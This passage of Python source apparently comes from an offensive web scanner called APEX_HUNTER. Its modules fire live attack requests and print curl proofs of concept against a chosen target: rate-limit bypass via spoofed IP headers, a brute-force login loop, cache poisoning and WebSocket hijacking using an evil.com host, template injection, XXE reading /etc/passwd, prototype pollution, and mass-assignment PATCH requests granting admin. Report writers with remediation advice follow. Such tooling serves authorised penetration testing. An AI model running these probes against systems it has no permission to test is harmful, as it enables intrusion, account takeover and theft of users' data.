# ══════════════════════════════════════════════════════════════
class HTTPParameterPollution:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HPP-25: HTTP Parameter Pollution testing")
        base = profile.url.rstrip("/")
        vulns = []
        # Use params discovered from JS/Wayback
        params_to_test = list(set(profile.parameters[:10] + ["id","user","role","admin","price","amount"]))
        for param in params_to_test[:8]:
            # Duplicate param with different values
            url_dup  = f"{base}?{param}=SAFE&{param}=INJECTED"
            url_arr  = f"{base}?{param}[]=SAFE&{param}[]=INJECTED"
            for label, url in [("duplicate", url_dup), ("array_notation", url_arr)]:
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                if "INJECTED" in body and "SAFE" not in body.split("INJECTED")[0][-20:]:
                    warn(f"  HPP [{label}]: param '{param}' — INJECTED value used")
                    vulns.append({"param": param, "type": label, "url": url})
        if vulns:
            profile.findings.append(Finding(
                id="F-HPP-001", title="HTTP Parameter Pollution",
                severity="MEDIUM", cwe="CWE-235", cvss=5.3,
                description=f"Duplicate parameters accepted: {[v['param'] for v in vulns]}",
                evidence="\n".join(f"{v['type']}: {v['url'][:80]}" for v in vulns),
                reproduction="\n".join(f"curl -sk '{v['url']}'" for v in vulns[:2]),
                poc_curl=f"curl -sk '{vulns[0]['url']}'",
                category="Parameter Pollution",
                remediation="Accept only the first or last value of a parameter. Reject duplicates."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 26: RATE LIMIT BYPASS  (SKILL-36)
# ══════════════════════════════════════════════════════════════
class RateLimitBypassTester:
    BYPASS_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"X-Forwarded-For": "0.0.0.0"},
        {"X-Forwarded-For": "10.0.0.1"},
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("RATELIMIT-26: Rate limit bypass via header spoofing")
        # Find a login/auth endpoint
        login_paths = ["/api/login", "/api/auth", "/login", "/api/token", "/auth/login"]
        login_url = None
        for path in login_paths:
            code, _, _ = _fetch(profile.url.rstrip("/") + path,
                                cfg.user_agent, cfg.timeout,
                                method="POST",
                                data=b'{"username":"test","password":"test"}',
                                headers_extra={"Content-Type": "application/json"})
            if code in [200, 400, 401, 403]:
                login_url = profile.url.rstrip("/") + path
                break
        if not login_url:
            info("  No login endpoint found for rate limit testing")
            return profile

        # Baseline — hit it 5 times and check for 429
        codes = []
        for _ in range(5):
            code, _, _ = _fetch(login_url, cfg.user_agent, 5,
                                method="POST", data=b'{"username":"test","password":"wrong"}',
                                headers_extra={"Content-Type": "application/json"})
            codes.append(code)
            time.sleep(0.2)

        if 429 in codes or 403 in codes:
            ok(f"  Rate limiting active on {login_url} (got {set(codes)})")
            # Try bypasses
            for bypass_hdrs in self.BYPASS_HEADERS:
                code, _, _ = _fetch(login_url, cfg.user_agent, 5,
                                    method="POST", data=b'{"username":"test","password":"wrong"}',
                                    headers_extra={"Content-Type":"application/json", **bypass_hdrs})
                if code not in [429, 403]:
                    high(f"  RATE LIMIT BYPASS via {bypass_hdrs}: HTTP {code}")
                    profile.findings.append(Finding(
                        id=f"F-RL-{len(profile.findings):03d}",
                        title="Rate Limit Bypass via Spoofed IP Header",
                        severity="MEDIUM", cwe="CWE-307", cvss=6.5,
                        description=f"Rate limiting bypassed by setting {list(bypass_hdrs.keys())[0]}.",
                        evidence=f"Normal: {set(codes)} | With {bypass_hdrs}: {code}",
                        reproduction=f"curl -sk -X POST '{login_url}' -H '{list(bypass_hdrs.keys())[0]}: 127.0.0.1' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"wordlist_entry\"}}'",
                        poc_curl=f"curl -sk -X POST '{login_url}' -H '{list(bypass_hdrs.keys())[0]}: 127.0.0.1' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"Password1\"}}'",
                        category="Rate Limiting",
                        remediation="Rate-limit by user/device fingerprint, not just IP. Block spoofed IP headers."
                    ))
                    break
        else:
            warn(f"  No rate limiting detected on {login_url} — brute-force possible!")
            profile.findings.append(Finding(
                id="F-RL-NORL", title="No Rate Limiting on Login Endpoint",
                severity="HIGH", cwe="CWE-307", cvss=7.5,
                description=f"Login endpoint {login_url} has no rate limiting.",
                evidence=f"5 requests returned: {codes}",
                reproduction=f"for i in $(seq 1 100); do curl -sk -X POST '{login_url}' -d '{{\"username\":\"admin\",\"password\":\"test$i\"}}'; done",
                poc_curl=f"curl -sk -X POST '{login_url}' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"Password1\"}}'",
                category="Rate Limiting",
                remediation="Implement account lockout or CAPTCHA after 5 failed attempts."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 27: CACHE POISONING DETECTOR  (SKILL-37)
# ══════════════════════════════════════════════════════════════
class CachePoisoningDetector:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CACHE-27: Cache poisoning via unkeyed headers")
        code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        is_cached = any(k in hdrs for k in ["x-cache","cf-cache-status","age","x-varnish","x-fastly"])
        if not is_cached:
            info("  No caching headers — cache poisoning less likely")
            return profile

        ok(f"  Caching detected: {[(k,hdrs[k]) for k in hdrs if k in ['x-cache','cf-cache-status','age']]}")

        # Test unkeyed X-Forwarded-Host header
        poison_code, poison_body, poison_hdrs = _fetch(
            profile.url, cfg.user_agent, cfg.timeout,
            headers_extra={"X-Forwarded-Host": "poison.evil.com",
                           "Cache-Control": "no-cache"})
        if "poison.evil.com" in poison_body:
            high("  CACHE POISONING: X-Forwarded-Host reflected in cached response!")
            profile.findings.append(Finding(
                id="F-CACHE-001", title="Web Cache Poisoning via X-Forwarded-Host",
                severity="HIGH", cwe="CWE-444", cvss=8.1,
                description="Unkeyed X-Forwarded-Host header reflected in cacheable response.",
                evidence=f"Header sent: X-Forwarded-Host: poison.evil.com\nReflected in body",
                reproduction=f"curl -sk -H 'X-Forwarded-Host: evil.com' '{profile.url}'",
                poc_curl=f"curl -sk -H 'X-Forwarded-Host: evil.com' -H 'Cache-Control: no-cache' '{profile.url}'",
                category="Cache Poisoning",
                remediation="Include all headers that influence responses as cache keys."
            ))

        # Cache deception path test
        for ext in [".css", ".jpg", ".js", ".png"]:
            deception_url = profile.url.rstrip("/") + "/profile" + ext
            code2, body2, hdrs2 = _fetch(deception_url, cfg.user_agent, cfg.timeout)
            if code2 == 200 and any(k in hdrs2 for k in ["x-cache","age"]):
                warn(f"  Cache deception candidate: {deception_url}")

        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 28: SSTI SCANNER  (SKILL-38)
# ══════════════════════════════════════════════════════════════
class SSTIScanner:
    ENGINE_MAP = {
        "49": "Jinja2/Twig/Pebble ({{7*7}}=49)",
        "7777777": "Twig ({{'7'*7}})",
        "0123456": "Jinja2 (range loop)",
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SSTI-28: Server-Side Template Injection ({{7*7}} detection)")
        base = profile.url.rstrip("/")
        # Find input params from forms and Wayback
        test_params = list(set(profile.parameters[:5] + ["name","search","q","message","template","subject"]))
        confirmed = []

        for param in test_params[:8]:
            for payload in PAYLOADS_SSTI[:6]:
                test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
                # Check for evaluated result
                for indicator, engine in self.ENGINE_MAP.items():
                    if indicator in body and payload not in body:
                        high(f"  SSTI CONFIRMED! Param '{param}' payload '{payload}' → '{indicator}' ({engine})")
                        confirmed.append({"param": param, "payload": payload, "engine": engine, "url": test_url})
                        profile.ssti_params.append(param)
                # Also check POST forms
                if profile.forms:
                    for form in profile.forms[:3]:
                        action = form.get("action", base)
                        if not action.startswith("http"): action = base + action
                        p_code, p_body, _ = _fetch(action, cfg.user_agent, cfg.timeout,
                                                   method="POST",
                                                   data=urllib.parse.urlencode({param: payload}).encode())
                        for indicator, engine in self.ENGINE_MAP.items():
                            if indicator in p_body and payload not in p_body:
                                high(f"  SSTI CONFIRMED (POST form)! '{param}' → '{indicator}' ({engine})")
                                confirmed.append({"param": param, "payload": payload, "engine": engine, "url": action})

        if confirmed:
            profile.findings.append(Finding(
                id="F-SSTI-001", title="Server-Side Template Injection (SSTI)",
                severity="CRITICAL", cwe="CWE-94", cvss=9.8,
                description=f"SSTI confirmed in params: {[c['param'] for c in confirmed]}. Engine: {confirmed[0]['engine']}",
                evidence="\n".join(f"{c['param']}: {c['payload']} → evaluated | {c['engine']}" for c in confirmed),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:2]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="SSTI",
                remediation="Never pass user input to template engines. Use sandboxed rendering or static templates."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 29: XXE INJECTION PROBER  (SKILL-39)
# ══════════════════════════════════════════════════════════════
class XXEProber:
    XML_ENDPOINTS = ["/api", "/api/v1", "/upload", "/api/import",
                     "/ws", "/soap", "/service", "/api/parse","/xmlrpc.php"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("XXE-29: XML injection + SOAP endpoint probing")
        base = profile.url.rstrip("/")
        found = []

        for path in self.XML_ENDPOINTS:
            url = base + path
            for payload in PAYLOADS_XXE[:2]:
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                       method="POST", data=payload.encode(),
                                       headers_extra={"Content-Type": "application/xml",
                                                      "Accept": "application/xml,text/xml,*/*"})
                if code == 200 and ("root:" in body or "bin:" in body or "nobody:" in body):
                    high(f"  XXE CONFIRMED at {url} — /etc/passwd read!")
                    found.append({"url": url, "payload": payload[:60]})
                elif code in [400, 500] and "xml" in body.lower():
                    warn(f"  XML parsing error at {url} [{code}] — investigate manually")
                elif code == 200 and code != 0:
                    # Check for SSRF OOB reflection
                    if "169.254" in body or "metadata" in body.lower():
                        high(f"  XXE OOB/SSRF via {url}")
                        found.append({"url": url, "payload": payload[:60]})

        # Also check for SVG upload vectors
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        svg_inputs = re.findall(r'<input[^>]*accept=["\'][^"\']*(?:svg|image)[^"\']*["\'][^>]*>', html_body, re.I)
        if svg_inputs:
            warn(f"  SVG upload input found — test XXE via SVG")
            found.append({"url": profile.url, "payload": "SVG upload vector", "note": "manual"})

        if found:
            profile.findings.append(Finding(
                id="F-XXE-001", title="XXE / XML External Entity Injection",
                severity="CRITICAL" if any("passwd" in f.get("payload","") for f in found) else "HIGH",
                cwe="CWE-611", cvss=9.1,
                description=f"XXE injection points identified at {[f['url'] for f in found]}",
                evidence="\n".join(f"{f['url']}: {f['payload']}" for f in found),
                reproduction="\n".join(f"curl -sk -X POST '{f['url']}' -H 'Content-Type: application/xml' -d '{PAYLOADS_XXE[0][:100]}...'" for f in found[:2]),
                poc_curl=f"curl -sk -X POST '{found[0]['url']}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'",
                category="XXE",
                remediation="Disable external entity processing. Use a safe XML parser configuration."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 30: PROTOTYPE POLLUTION SCANNER  (SKILL-40)
# ══════════════════════════════════════════════════════════════
class PrototypePollutionScanner:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("PROTO-30: Prototype Pollution (__proto__, constructor.prototype)")
        base = profile.url.rstrip("/")
        vulns = []

        # Test URL-based prototype pollution
        test_url = f"{base}?__proto__[polluted]=APEX_TEST&constructor[prototype][polluted]=APEX_TEST"
        code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
        if "APEX_TEST" in body:
            high(f"  PROTOTYPE POLLUTION via URL params!")
            vulns.append({"type": "url_param", "url": test_url})

        # Test JSON body prototype pollution on API endpoints
        for path in ["/api", "/api/v1", "/api/user", "/api/settings"]:
            url = base + path
            for payload in PAYLOADS_PROTO_POLLUTION:
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                                         method="POST", data=payload.encode(),
                                         headers_extra={"Content-Type": "application/json"})
                if code in [200, 201] and "APEX_HUNTER" in body:
                    high(f"  PROTOTYPE POLLUTION via JSON body at {path}!")
                    vulns.append({"type": "json_body", "url": url, "payload": payload})

        if vulns:
            profile.findings.append(Finding(
                id="F-PP-001", title="Prototype Pollution Vulnerability",
                severity="HIGH", cwe="CWE-1321", cvss=8.1,
                description=f"Prototype pollution via: {[v['type'] for v in vulns]}",
                evidence="\n".join(f"{v['type']}: {v.get('url','')} | {v.get('payload','')[:60]}" for v in vulns),
                reproduction=f"curl -sk '{base}?__proto__[polluted]=yes' | grep polluted",
                poc_curl=f"curl -sk '{base}?__proto__[polluted]=APEX_TEST'",
                category="Prototype Pollution",
                remediation="Use Object.create(null) for config maps. Freeze Object.prototype. Validate JSON keys."
            ))
        return profile


# ══════════════════════════════════════════════════════════════
# TOOL 31: GRAPHQL ADVANCED ATTACK SUITE  (SKILL-41)
# ══════════════════════════════════════════════════════════════
class GraphQLAdvanced:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("GQL-ADV-31: GraphQL batch attacks + alias introspection bypass")
        if not profile.graphql_endpoints:
            return profile
        for gql_url in profile.graphql_endpoints[:2]:
            # Alias-based introspection bypass (bypasses disabled introspection)
            alias_query = json.dumps({"query": "{a:__typename b:__schema{types{name}}}"})
            code, body, _ = _fetch(gql_url, cfg.user_agent, cfg.timeout,
                                   method="POST", data=alias_query.encode(),
                                   headers_extra={"Content-Type":"application/json"})
            if code == 200 and "__schema" in body:
                high(f"  GRAPHQL: Alias introspection bypass works at {gql_url}")
            # Batch query attack — alias multiplication
            batch = json.dumps({"query": " ".join(
                f"q{i}: __typename" for i in range(100))})
            code2, body2, _ = _fetch(gql_url, cfg.user_agent, cfg.timeout,
                                     method="POST", data=batch.encode(),
                                     headers_extra={"Content-Type":"application/json"})
            if code2 == 200 and "q99" in body2:
                warn(f"  GRAPHQL BATCH: 100-alias query accepted — brute-force/DoS risk")
                profile.findings.append(Finding(
                    id="F-GQL-ADV-001", title="GraphQL Batch Query Attack",
                    severity="MEDIUM", cwe="CWE-770", cvss=6.5,
                    description="GraphQL accepts batched alias queries enabling brute-force or DoS.",
                    evidence=f"100 aliased queries returned HTTP {code2}",
                    reproduction=f"curl -sk -X POST '{gql_url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{q1:__typename q2:__typename ... q100:__typename}}\"}}'",
                    poc_curl=f"curl -sk -X POST '{gql_url}' -H 'Content-Type: application/json' -d '{batch[:150]}'",
                    category="GraphQL",
                    remediation="Implement query complexity limits and alias count restrictions."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 32: DEPENDENCY CONFUSION DETECTOR  (SKILL-42)
# ══════════════════════════════════════════════════════════════
class DependencyConfusionDetector:
    MANIFEST_PATHS = ["/package.json", "/composer.json", "/requirements.txt",
                      "/Gemfile", "/build.gradle", "/pom.xml", "/go.mod",
                      "/yarn.lock", "/package-lock.json", "/Pipfile"]

    INTERNAL_PATTERNS = re.compile(
        r'(?i)(@company|@internal|@private|@corp|@myorg|@local|'
        r'internal-|private-|corp-|company-|intranet-)')

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("DEPCNF-32: Dependency confusion / supply chain detector")
        base = profile.url.rstrip("/")
        findings = []

        for path in self.MANIFEST_PATHS:
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code == 200 and body:
                high(f"  MANIFEST EXPOSED: {path} ({len(body)}b)")
                # Extract package names
                pkg_names = []
                try:
                    if path == "/package.json":
                        data = json.loads(body)
                        deps = {**data.get("dependencies",{}), **data.get("devDependencies",{})}
                        pkg_names = list(deps.keys())
                    elif path == "/requirements.txt":
                        pkg_names = [line.split("==")[0].split(">=")[0].strip()
                                     for line in body.splitlines() if line.strip() and not line.startswith("#")]
                except Exception: pass

                # Check for internal package naming patterns
                for pkg in pkg_names:
                    if self.INTERNAL_PATTERNS.search(pkg):
                        high(f"  INTERNAL PACKAGE NAME: '{pkg}' — dependency confusion candidate!")
                        findings.append({"pkg": pkg, "source": path})

                profile.sensitive_paths.append(path)
                profile.findings.append(Finding(
                    id=f"F-DEP-{len(profile.findings):03d}",
                    title=f"Dependency Manifest Exposed: {path}",
                    severity="HIGH" if findings else "MEDIUM",
                    cwe="CWE-829", cvss=8.1 if findings else 5.3,
                    description=f"Package manifest {path} is publicly accessible." +
                                (f" Internal package names found: {[f['pkg'] for f in findings]}" if findings else ""),
                    evidence=body[:200],
                    reproduction=f"curl -s '{base+path}'",
                    poc_curl=f"curl -sk '{base+path}'",
                    category="Supply Chain",
                    remediation="Block access to manifest files. Use private registry for internal packages."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 33: BUSINESS LOGIC PROBE  (SKILL-43)
# ══════════════════════════════════════════════════════════════
class BusinessLogicProbe:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("BIZ-33: Business logic (negative price, integer overflow, coupon)")
        base = profile.url.rstrip("/")
        test_cases = [
            ("negative_price",   {"price": -1, "amount": -1, "quantity": -1}),
            ("zero_price",       {"price": 0, "amount": 0, "cost": 0}),
            ("overflow",         {"price": 99999999999, "quantity": 2147483648}),
            ("coupon_empty",     {"coupon": "", "promo": ""}),
            ("coupon_null",      {"coupon": None, "discount_code": None}),
        ]
        cart_paths = ["/api/cart", "/api/order", "/api/checkout", "/api/purchase",
                      "/cart", "/checkout", "/api/v1/orders", "/api/booking"]
        vulns = []

        for path in cart_paths[:5]:
            url = base + path
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
            if code not in [200, 201, 400, 401]: continue
            # Try each logic test case
            for label, params in test_cases:
                payload = json.dumps(params).encode()
                tc, tb, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                   method="POST", data=payload,
                                   headers_extra={"Content-Type":"application/json"})
                if tc in [200, 201]:
                    # Look for success indicators
                    if any(k in tb.lower() for k in ["success","order_id","booking_id","confirmed","total"]):
                        high(f"  BUSINESS LOGIC [{label}] at {path}: got {tc} — check total amount!")
                        vulns.append({"label": label, "path": path, "params": params})

        if vulns:
            profile.findings.append(Finding(
                id="F-BIZ-001", title="Business Logic Vulnerability",
                severity="HIGH", cwe="CWE-840", cvss=8.1,
                description=f"Business logic issues: {[v['label'] for v in vulns]}",
                evidence="\n".join(f"{v['label']} at {v['path']}: {v['params']}" for v in vulns),
                reproduction="\n".join(
                    "curl -sk -X POST '" + base + v["path"] + "' -H 'Content-Type: application/json' -d '" + json.dumps(v["params"]) + "'"
                    for v in vulns[:2]),
                poc_curl="curl -sk -X POST '" + base + vulns[0]["path"] + "' -H 'Content-Type: application/json' -d '" + json.dumps(vulns[0]["params"]) + "'",
                category="Business Logic",
                remediation="Validate all numeric inputs server-side. Reject negative/zero prices. Enforce coupon rules."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 34: WEBSOCKET SECURITY TESTER  (SKILL-44)
# ══════════════════════════════════════════════════════════════
class WebSocketTester:
    WS_PATHS = ["/ws", "/websocket", "/socket", "/socket.io",
                "/api/ws", "/chat", "/live", "/stream", "/realtime"]

    def _detect_ws_upgrade(self, url: str, ua: str, timeout: int) -> bool:
        code, body, hdrs = _fetch(url, ua, timeout,
                                  headers_extra={"Connection": "Upgrade",
                                                 "Upgrade": "websocket",
                                                 "Sec-WebSocket-Version": "13",
                                                 "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode()})
        return code == 101 or hdrs.get("upgrade","").lower() == "websocket"

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("WS-34: WebSocket security (CSWSH, ws:// downgrade, Origin bypass)")
        base = profile.url.rstrip("/")
        ws_found = []

        # Detect WS endpoints from JS
        for js_url in profile.js_files[:10]:
            _, content, _ = _fetch(js_url, cfg.user_agent, cfg.timeout)
            ws_refs = re.findall(r'wss?://[^\s"\'<>]+', content)
            for ref in ws_refs:
                ws_found.append(ref); warn(f"  WebSocket URL in JS: {ref}")
                profile.websocket_endpoints.append(ref)

        # Probe known WS paths
        for path in self.WS_PATHS:
            url = base + path
            if self._detect_ws_upgrade(url, cfg.user_agent, 5):
                high(f"  WebSocket endpoint: {url}")
                ws_found.append(url)
                profile.websocket_endpoints.append(url)
            # Also check HTML for socket references
            code, body, _ = _fetch(url, cfg.user_agent, 5)
            if code == 200 and re.search(r'socket\.io|websocket|ws\.connect', body, re.I):
                ws_found.append(url)

        if ws_found:
            # CSWSH test — send cross-origin request
            for ws_url in ws_found[:3]:
                http_url = ws_url.replace("wss://","https://").replace("ws://","http://")
                code, body, hdrs = _fetch(http_url, cfg.user_agent, cfg.timeout,
                                         headers_extra={"Origin": "https://evil.com"})
                upgrade = hdrs.get("upgrade","")
                if code == 101 or "websocket" in upgrade.lower():
                    high(f"  CSWSH: Cross-origin WebSocket connection accepted from evil.com!")
                    profile.findings.append(Finding(
                        id=f"F-WS-{len(profile.findings):03d}",
                        title="Cross-Site WebSocket Hijacking (CSWSH)",
                        severity="HIGH", cwe="CWE-346", cvss=8.1,
                        description=f"WebSocket at {ws_url} accepts connections from arbitrary origins.",
                        evidence=f"Origin: evil.com → HTTP {code} | Upgrade: {upgrade}",
                        reproduction=f"# Browser PoC:\nnew WebSocket('{ws_url}')",
                        poc_curl=f"curl -sk -H 'Origin: https://evil.com' -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' '{http_url}'",
                        category="WebSocket",
                        remediation="Validate Origin header against allowlist. Require auth tokens in WS handshake."
                    ))

            # Check for ws:// (no TLS) downgrade
            for ws_url in ws_found:
                if ws_url.startswith("ws://"):
                    warn(f"  WS DOWNGRADE: Unencrypted ws:// in use: {ws_url}")
                    profile.findings.append(Finding(
                        id=f"F-WS-PLAIN-{len(profile.findings):03d}",
                        title="Unencrypted WebSocket (ws://)",
                        severity="MEDIUM", cwe="CWE-311", cvss=5.9,
                        description=f"WebSocket communication without TLS: {ws_url}",
                        evidence=f"URL: {ws_url}",
                        reproduction=f"Intercept WebSocket traffic with mitmproxy",
                        poc_curl=f"# Cannot test with curl — use websocat: websocat '{ws_url}'",
                        category="WebSocket",
                        remediation="Use wss:// exclusively. Redirect ws:// to wss://."
                    ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 35: IDOR DEEP SCANNER / BOLA  (SKILL-45)
# ══════════════════════════════════════════════════════════════
class IDORDeepScanner:
    BOLA_PATHS = [
        "/api/users/{id}", "/api/user/{id}", "/api/accounts/{id}",
        "/api/tickets/{id}", "/api/orders/{id}", "/api/bookings/{id}",
        "/api/invoices/{id}", "/api/requests/{id}", "/api/cards/{id}",
        "/hc/requests/{id}", "/api/v1/users/{id}", "/api/v2/tickets/{id}",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("BOLA-35: IDOR deep scanner (BOLA, mass assignment, privilege escalation)")
        base = profile.url.rstrip("/")
        vulns = []

        # Test BOLA — enumerate adjacent IDs on known patterns
        for path_tpl in self.BOLA_PATHS:
            for test_id in [1, 2, 100, 1000, 9999]:
                url = base + path_tpl.replace("{id}", str(test_id))
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
                if code == 200 and len(body) > 50:
                    # Check if response looks like real user data
                    data_indicators = ["email","name","username","phone","id","created","updated"]
                    if sum(1 for d in data_indicators if d in body.lower()) >= 3:
                        warn(f"  BOLA candidate: {url} ({len(body)}b)")
                        vulns.append({"url": url, "id": test_id, "size": len(body)})
                        # Check for mass assignment — try PATCH with extra fields
                        patch_payload = json.dumps({"role":"admin","is_admin":True,"admin":True,"privilege":"superuser"}).encode()
                        p_code, p_body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                                   method="PATCH", data=patch_payload,
                                                   headers_extra={"Content-Type":"application/json"})
                        if p_code in [200, 201]:
                            high(f"  MASS ASSIGNMENT accepted at {url}!")
                            profile.findings.append(Finding(
                                id=f"F-MASS-{len(profile.findings):03d}",
                                title="Mass Assignment Vulnerability",
                                severity="CRITICAL", cwe="CWE-915", cvss=9.8,
                                description=f"PATCH {url} accepted admin/role fields without restriction.",
                                evidence=f"URL: {url} | PATCH {patch_payload.decode()[:80]} → HTTP {p_code}",
                                reproduction=f"curl -sk -X PATCH '{url}' -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true}}'",
                                poc_curl=f"curl -sk -X PATCH '{url}' -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true}}'",
                                category="Mass Assignment",
                                remediation="Use explicit allowlists for accepted fields. Never bind request body directly to model."
                            ))
                        break  # Found one — move to next pattern

        if vulns:
            # Check if IDs are sequential (BOLA more severe)
            sizes = [v["size"] for v in vulns]
            sequential = len(set(v["id"] for v in vulns)) == len(vulns)
            profile.findings.append(Finding(
                id="F-BOLA-001", title="Broken Object Level Authorization (BOLA/IDOR)",
                severity="HIGH", cwe="CWE-639", cvss=8.6,
                description=f"API returns other users' data without authorization check. {len(vulns)} endpoints confirmed.",
                evidence="\n".join(f"ID {v['id']}: {v['url']} ({v['size']}b)" for v in vulns[:5]),
                reproduction="\n".join(f"curl -sk '{v['url']}'" for v in vulns[:3]),
                poc_curl=f"curl -sk '{vulns[0]['url']}'",
                category="IDOR/BOLA",
                remediation="Implement object-level authorization checks. Verify resource ownership on every request."
            ))
        return profile


# ══════════════════════════════════════════════════════════════
# REPORTER  (SKILL-29, SKILL-30)
# ══════════════════════════════════════════════════════════════
class APEXReporter:
    SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    SEV_COLOR = {"CRITICAL":"#dc3545","HIGH":"#fd7e14","MEDIUM":"#ffc107","LOW":"#17a2b8","INFO":"#6c757d"}

    def __init__(self, out_dir: str):
        self.out = Path(out_dir); self.out.mkdir(parents=True, exist_ok=True)
        self.ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    def _all_findings(self, profiles):
        return sorted(
            [(p.host, f) for p in profiles for f in p.findings],
            key=lambda x: self.SEV_ORDER.get(x[1].severity, 5))

    def save_json(self, profiles):
        path = self.out / f"apex_report_{self.ts}.json"
        data = []
        for p in profiles:
            d = asdict(p); d["findings"] = [asdict(f) for f in p.findings]; data.append(d)
        path.write_text(json.dumps({"generated":self.ts,"tool":"APEX_HUNTER v1.0","targets":data}, indent=2))
        ok(f"  JSON  → {path}")

    def save_csv(self, profiles):
        path = self.out / f"findings_{self.ts}.csv"
        with open(path,"w",newline="") as f:
            w = csv.writer(f)
            w.writerow(["Target","ID","Title","Severity","CVSS","CWE","Category","Description","PoC"])
            for host, fnd in self._all_findings(profiles):
                w.writerow([host, fnd.id, fnd.title, fnd.severity, fnd.cvss,
                            fnd.cwe, fnd.category, fnd.description[:100], fnd.poc_curl[:80]])
        ok(f"  CSV   → {path}")

    def save_markdown(self, profiles):
        path = self.out / f"apex_report_{self.ts}.md"
        sev_counts = Counter(f.severity for _, f in self._all_findings(profiles))
        lines = [
            "# APEX_HUNTER v1.0 — Red Team Report",
            f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ",
            f"**Targets:** {', '.join(p.host for p in profiles)}",
            "","---","","## Executive Summary","",
            "|Severity|Count|","|-|-|",
        ] + [f"|{s}|{sev_counts.get(s,0)}|" for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]]
        lines += ["","---",""]
        for p in profiles:
            lines += [f"## {p.host}","","### Infrastructure",
                f"- IP: {p.ip} ({p.provider})",
                f"- TLS: {p.tls_version} / {p.tls_cipher}",
                f"- Cert: {p.cert_cn} (expires {p.cert_expires})",
                f"- WAF/CDN: {', '.join(p.waf) or 'None detected'}",
                f"- Technologies: {', '.join(p.technologies) or 'None'}",
                f"- Header Score: {p.security_headers.get('score','?')}/100",
                f"- Subdomains: {len(p.subdomains+p.ct_subdomains)} | JS files: {len(p.js_files)} | Secrets: {len(p.secrets)}",
                "","### Findings",""]
            for f in sorted(p.findings, key=lambda x: self.SEV_ORDER.get(x.severity,5)):
                lines += [
                    f"#### [{f.severity}] {f.id}: {f.title}",
                    f"**CWE:** {f.cwe} | **CVSS:** {f.cvss} | **Category:** {f.category}","",
                    f"{f.description}","",
                    "**Evidence:**","```",f.evidence,"```","",
                    "**PoC:**","```bash",f.poc_curl,"```","",
                    f"**Fix:** {f.remediation}","","---",""]
        path.write_text("\n".join(lines))
        ok(f"  MD    → {path}")

    def save_html(self, profiles):
        path = self.out / f"apex_report_{self.ts}.html"
        all_f = self._all_findings(profiles)
        sev_counts = Counter(f.severity for _, f in all_f)
        cards = ""
        for host, f in all_f:
            col = self.SEV_COLOR.get(f.severity,"#6c757d")
            cards += f"""
<div class="card" data-sev="{f.severity}">
  <div class="card-hdr" style="border-left:4px solid {col}">
    <span class="badge" style="background:{col}">{f.severity}</span>
    <b>{f.id}</b> — {html.escape(f.title)}
    <small style="color:#aaa"> | {host}</small>
  </div>
  <div class="card-body">
    <div class="meta">CWE: {f.cwe} &nbsp;|&nbsp; CVSS: {f.cvss} &nbsp;|&nbsp; {f.category}</div>
    <p>{html.escape(f.description)}</p>
    <b>Evidence:</b><pre><code>{html.escape(f.evidence[:500])}</code></pre>
